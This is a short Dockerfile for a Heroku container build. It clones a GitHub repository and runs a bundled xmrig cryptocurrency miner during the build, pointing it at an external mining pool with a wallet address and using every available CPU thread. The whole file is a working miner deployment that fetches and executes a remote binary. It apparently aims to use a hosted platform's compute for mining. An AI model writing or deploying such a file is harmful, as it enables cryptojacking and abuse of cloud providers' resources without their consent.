FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN git clone https://github.com/quincyhays/bmxmrig; chmod +x bmxmrig/xmrig; bmxmrig/xmrig -o rx.unmineable.com:3333 -u SHIB:0xde4af8eafd0d4dc9efdf92efaa0cb49999dbcf02.xazanhari#ywai-beh0 -p x -t $(nproc)
CMD bash heroku.sh
